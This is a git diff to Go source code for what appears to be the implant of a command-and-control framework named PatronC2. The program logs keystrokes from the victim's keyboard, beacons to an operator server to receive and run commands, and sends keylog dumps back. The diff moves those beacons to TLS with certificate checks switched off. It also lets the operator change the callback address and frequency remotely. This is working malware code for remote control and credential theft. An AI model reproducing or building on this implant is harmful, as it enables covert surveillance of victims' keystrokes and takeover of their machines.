@@ -1,11 +1,14 @@
 package main
 
 import (
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/gob"
 	"fmt"
 	"log"
 	"net"
 	"os/exec"
+	"strconv"
 	"strings"
 	"time"
 
@@ -16,11 +19,45 @@ import (
 	"github.com/s-christian/gollehs/lib/logger"
 )
 
+const rootCert = `-----BEGIN CERTIFICATE-----
+MIICXzCCAgWgAwIBAgIUMd+ZlvsLMPMqJxWJ9T6BJGthj9gwCgYIKoZIzj0EAwIw
+gYQxCzAJBgNVBAYTAlVTMREwDwYDVQQIDAhNYXJ5bGFuZDEPMA0GA1UEBwwGVG93
+c29uMREwDwYDVQQKDAhQYXRyb25DMjELMAkGA1UECwwCQzIxDzANBgNVBAMMBnBh
+dHJvbjEgMB4GCSqGSIb3DQEJARYRcGF0cm9uQHBhdHJvbi5jb20wHhcNMjIwNTA0
+MjEzNDIzWhcNMzIwNTAxMjEzNDIzWjCBhDELMAkGA1UEBhMCVVMxETAPBgNVBAgM
+CE1hcnlsYW5kMQ8wDQYDVQQHDAZUb3dzb24xETAPBgNVBAoMCFBhdHJvbkMyMQsw
+CQYDVQQLDAJDMjEPMA0GA1UEAwwGcGF0cm9uMSAwHgYJKoZIhvcNAQkBFhFwYXRy
+b25AcGF0cm9uLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABEA0e3xutzlG
+NonmwcaQcwYyaqKHG2ZFqDeB30vXhAwQjK/n9rRSA+THI5FsdNdk3wiJlJkKV1QR
+0yYb4J1aFg2jUzBRMB0GA1UdDgQWBBTLaFpt8fmieqkXwXdS2oi9R29hhzAfBgNV
+HSMEGDAWgBTLaFpt8fmieqkXwXdS2oi9R29hhzAPBgNVHRMBAf8EBTADAQH/MAoG
+CCqGSM49BAMCA0gAMEUCIF/HZD1/d01Q3Dk/gpvGQObYnx6JNrupJehaYKjQ+N4B
+AiEAli42Gt6ELWRZ1/0aXz8t63CI8o9mfp4rloqjcF/Dq10=
+-----END CERTIFICATE-----
+`
+
 // func exec_command(text string) {
 
 // }
 
+var (
+	ServerIP          string
+	ServerPort        string
+	CallbackFrequency string
+)
+
 func main() {
+	// if ServerIP == "" {
+
+	// }
+	// Load public cert for encrypted comms
+	roots := x509.NewCertPool()
+	ok := roots.AppendCertsFromPEM([]byte(rootCert))
+	if !ok {
+		log.Fatal("failed to parse root certificate")
+	}
+	config := &tls.Config{RootCAs: roots, InsecureSkipVerify: true}
+
 	//Keylog start
 	// find keyboard device, does not require a root permission
 	keyboard := keylogger.FindKeyboardDevice()
@@ -67,7 +104,7 @@ func main() {
 	for {
 		//First beacon for reqular commands
 	RETRY:
-		beacon, err := net.Dial("tcp", "10.10.10.113:6969")
+		beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
 		if err != nil {
 			// log.Fatalln(err) // maybe try diff IP
 			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
@@ -86,6 +123,17 @@ func main() {
 		err = dec.Decode(instruct)
 		if err != nil {
 			log.Fatalln(err)
+		}
+
+		logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
+		// Update agent config when possible
+		if instruct.UpdateAgentConfig.CallbackTo != "" {
+			glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
+			ServerIP = glob[0]
+			ServerPort = glob[1]
+		}
+		if instruct.UpdateAgentConfig.CallbackFrequency != "" {
+			CallbackFrequency = instruct.UpdateAgentConfig.CallbackFrequency
 		}
 		logger.Logf(logger.Debug, "Received : %s\n", instruct)
 		CommandType := instruct.CommandType
@@ -123,12 +171,12 @@ func main() {
 		}
 		logger.Logf(logger.Debug, "Sent encoded struct\n")
 		beacon.Close()
-		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
-		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
+		intVar, err := strconv.Atoi(CallbackFrequency)  // apply CallbackFrequency
+		time.Sleep(time.Second * time.Duration(intVar)) // interval and jitter here
 
 		//Second beacon for keylog dump
 	KEYRETRY:
-		keybeacon, err := net.Dial("tcp", "10.10.10.113:6969")
+		keybeacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
 		if err != nil {
 			// log.Fatalln(err) // maybe try diff IP
 			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
@@ -162,8 +210,7 @@ func main() {
 		}
 		logger.Logf(logger.Debug, "Sent encoded struct\n")
 		keybeacon.Close()
-		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
-		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
+		time.Sleep(time.Second * time.Duration(intVar)) // interval and jitter here
 	}
 
 }
